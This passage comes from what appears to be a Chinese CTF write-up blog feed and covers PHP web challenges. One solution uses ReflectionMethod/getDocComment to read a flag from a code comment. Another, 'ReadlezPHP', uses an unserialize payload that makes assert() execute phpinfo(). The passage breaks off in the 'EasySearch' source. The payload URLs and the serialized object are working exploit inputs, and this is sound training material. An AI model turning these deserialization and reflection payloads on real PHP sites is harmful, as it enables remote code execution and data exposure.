&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;f&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;g&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;h&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;j&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;k&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;l&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;m&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;n&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;o&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;p&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;q&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;r&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;t&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;++&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;self&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;$c;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$rc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;rc&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$rb&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ra&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;ra&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$rd&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;rd&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$method&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; $rc($ra, $rb);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;var_dump&lt;/span&gt;($method&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;$rd());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个&lt;code&gt;$ra&lt;/code&gt;、&lt;code&gt;$rb&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;，源码虽然给出了&lt;code&gt;User&lt;/code&gt;类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。&lt;/p&gt;
&lt;p&gt;根据提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个&lt;code&gt;ReflectionMethod&lt;/code&gt;类，并且&lt;code&gt;ReflectionMethod&lt;/code&gt;类中刚好有一个&lt;code&gt;getDocComment&lt;/code&gt; 方法可以获得注释：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;简介：&lt;strong&gt;ReflectionMethod&lt;/strong&gt; 类报告了一个方法的有关信息。类报告了一个方法的有关信息&lt;/p&gt;
&lt;p&gt;ReflectionFunctionAbstract::getDocComment — 获取注释内容&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;源码中初始化创建对象为&lt;code&gt;new $rc($ra, $rb)&lt;/code&gt;，传递了两个参数，&lt;code&gt;ReflectionMethod&lt;/code&gt;类的初始化魔术方法也提供了两个参数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;public ReflectionMethod::__construct ( &lt;a class="link" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed" target="_blank" rel="noopener"
&gt;mixed&lt;/a&gt; &lt;code&gt;$class&lt;/code&gt; , string &lt;code&gt;$name&lt;/code&gt; )&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?rc=ReflectionMethod&amp;amp;ra=User&amp;amp;rb=q&amp;amp;rd=getDocComment
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;你能发现我吗string(152) &amp;#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题外话：在尝试过程中还发现了另一个类&lt;code&gt;ReflectionClass&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;简介：&lt;strong&gt;ReflectionClass&lt;/strong&gt; 类报告了一个类的有关信息。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;和上面的那个类对比，两个类研究的对象不一样&lt;strong&gt;ReflectionMethod&lt;/strong&gt;研究的是类中的方法，&lt;strong&gt;ReflectionClass&lt;/strong&gt; 研究的是类。&lt;/p&gt;
&lt;p&gt;这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。&lt;/p&gt;</description></item><item><title>ReadlezPHP&amp;EasySearch</title><link>https://www.braindance.top/posts/ctf/readlezphpeasysearch/</link><pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/readlezphpeasysearch/</guid><description>&lt;h1 id="readlezphp"&gt;ReadlezPHP
&lt;/h1&gt;&lt;p&gt;源码找到&lt;code&gt;time.php?source&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175641.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#error_reporting(0);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;HelloPhp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $a;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $b;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__construct&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;a&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Y-m-d h:i:s&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;b&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;date&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__destruct&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;a&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;b&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $b($a);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;HelloPhp&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;@&lt;/span&gt;$ppp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;data&amp;#34;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在&lt;code&gt;HelloPhp&lt;/code&gt;中有一个&lt;code&gt;__destruct&lt;/code&gt;方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如&lt;code&gt;$a($b)&lt;/code&gt;格式进行函数调用，假如变量&lt;code&gt;a&lt;/code&gt;为字符串&lt;code&gt;var_dump&lt;/code&gt;，&lt;code&gt;b&lt;/code&gt;是任意字符串，就相当于调用var_dump函数且参数为b。&lt;/p&gt;
&lt;p&gt;所以构造反序列化，调用assert函数执行phpinfo。如果向&lt;strong&gt;assert()&lt;/strong&gt; 函数传递字符串，它将会被 &lt;strong&gt;assert()&lt;/strong&gt; 当做 PHP 代码来执行)：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class HelloPhp
{
public $a=&amp;#39;phpinfo()&amp;#39;;
public $b=&amp;#39;assert&amp;#39;;
}
$s=new HelloPhp();
echo serialize($s);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;POST请求&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面查找flag，在environment中找到flag&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175822.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h1 id="easysearch"&gt;EasySearch
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420171541.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到&lt;code&gt;index.php.swp&lt;/code&gt;文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;ob_start&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;get_hash&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $chars &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $random &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $chars[&lt;span style="color:#a6e22e"&gt;mt_rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;73&lt;/span&gt;)]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$chars[&lt;span style="color:#a6e22e"&gt;mt_rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;73&lt;/span&gt;)]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$chars[&lt;span style="color:#a6e22e"&gt;mt_rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;73&lt;/span&gt;)]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$chars[&lt;span style="color:#a6e22e"&gt;mt_rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;73&lt;/span&gt;)]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$chars[&lt;span style="color:#a6e22e"&gt;mt_rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;73&lt;/span&gt;)];&lt;span style="color:#75715e"&gt;//Random 5 times
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;uniqid&lt;/span&gt;()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$random;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;sha1&lt;/span&gt;($content);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
